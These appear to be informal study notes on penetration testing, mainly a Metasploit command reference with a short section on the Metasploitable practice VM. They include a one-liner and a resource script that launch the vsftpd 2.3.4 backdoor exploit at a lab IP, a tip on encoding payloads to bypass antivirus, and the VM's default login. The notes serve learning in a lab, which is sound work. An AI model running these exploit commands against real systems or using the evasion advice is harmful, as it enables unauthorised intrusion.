




dh2048.pem # RSA key length = 2048 bit



tavis Ormandy -> google project zero

stuxnet virus
infosec === information security



vendor neutral

open courceware

OWASP: open web application security project
OWASP chapter in Egypt

OSCP
self marketing



- mentorship
# kung fu termnology: Explain any command line tools EX: metasploit kung fu, netcat kung fu, nmap kung fu, ...


----------------------------------------------------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------------------------------------------------
[Metasploit](https://www.metasploit.com)
========================================

- Metasploit Community
- Metasploit Pro

written in Ruby by Rapid7 use postgresql as a database
> GUI:
- armitage
- cobalt strike

> Commands:

- msfconsole -> open metasploite
- DB_status -> connection between metasploite and exploitation database
- exit
- msfdb
    - msfdb init => initialize the database
    - msfdb start => start the database
    - msfdb stop => stop the database
    - msfdb delete => delete database and stop using it
    - msfdb reimit => delete and reinitialize the database
# databse.yml => databses (msf, msf_test) congifration file

- help
> core commands
* banner
* show
    - exploits
    - auxiliary
    - post
    - payloads -> reverse connection
    - encoders -> encode payload to bypassing the antivirus like shikata_ga_nai -> (the most well-known encoder)
    - nops

show:
- options
- targets
- anvanced


- search "vsftp"

- hosts
- vulns


-------------------------------------------------------------------------------------------
> module
- use auxiliary/scanner/discovery/arp_sweep
- info
- show options
- set <option_name> <value>
- unset <option_name>
- setg <option_name> <value>
- unsetg <option_name>
- show targets
- run
- back -> back from spasfic payload to entry point (msf=metasploit framework)
-------------------------------------------------------------------------------------------


msfconsole -x "use exploit/unix/ftp/vsftpd_234_backdoor;set rhost 192.168.1.9;run"

-x "" => excute
in file my_payload.rc:
use exploit/unix/ftp/vsftpd_234_backdoor
set rhost 192.168.1.9
run

msfconsole -r ./my_payload.rc


- C-z -> session paly in background
- sessions -l --list
- sessions -i <session_number>


- db_nmap => use nmap from metasploit


IDS: detact attacks and reports it for seystem admin

--------------------------------------------------------------------------------------------------------------------------------
[metasploitable](https://information.rapid7.com/download-metasploitable-2017.html)

linux Virtual Machine to Test Metasploit contains several intentional vulnerabilities for you to exploit. Metasploitable is essentially a penetration testing lab in a box, available as a VMware virtual machine (VMX)
created by the Rapid7 Metasploit team. (The Metasploitable login is “msfadmin”; the password is also “msfadmin”.)


Taking your first steps with Metasploit can be difficult – especially if you don’t want to conduct your first penetration test on your production network.







---------------------------------------------------------------------------------------------------------------------------------------------------------
mfsconsole
search <>
show options
set option <option_name> <value>
run === exploit